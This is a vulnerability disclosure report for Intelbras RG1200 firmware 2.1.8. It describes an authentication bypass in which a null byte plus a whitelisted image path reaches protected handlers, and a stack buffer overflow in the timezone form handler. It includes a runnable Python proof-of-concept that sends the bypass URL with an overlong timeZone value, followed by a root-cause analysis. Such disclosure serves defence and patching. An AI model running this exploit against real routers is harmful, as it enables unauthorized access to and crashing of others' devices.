# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`form_fast_setting_timezone`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`form_fast_setting_timezone`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `form_fast_setting_timezone`. The handler parses the user-controlled `timeZone` parameter into small fixed-size stack buffers using unbounded `sscanf`, then copies data with `strcpy` into another small stack buffer, allowing out-of-bounds writes.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
    base = f"http://{target_ip}:{port}"

    # Endpoint naming here follows the dataset convention: use the function name.
    url = f"{base}/goform/form_fast_setting_timezone%00img/main-logo.png"

    data = {
        "timeZone": "+12:" + ("A" * 100),
    }

    headers = {
        "Cookie": cookie,
    }

    r = requests.post(url, data=data, headers=headers, timeout=10)
    print("status:", r.status_code)
    print(r.text[:2000])


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: python poc.py <target_ip> [port]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    exploit(ip, port=port)
```

## Cause Analysis

1. **authentication** : The HTTP request parsing logic stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` during `websUrlParse`. In `R7WebsSecurityHandler`, the whitelist is checked against the raw URL, while `websFormHandler` dispatches based on the decoded path, allowing crafted requests to bypass authentication and reach a protected `/goform` handler.

2. **stack overflow**: `form_fast_setting_timezone` obtains `timestr = websGetVar(wp, "timeZone", ...)` and parses it via `sscanf(timestr + 1, "%[^:]:%s", timespand, timespand[1])` where `timespand` is `char timespand[2][4]` (unbounded specifiers). It then executes `strcpy(sys_timenextzone, timespand[1])` where `sys_timenextzone` is `char[4]`. Both operations can write beyond stack buffer bounds when `timeZone` is long.
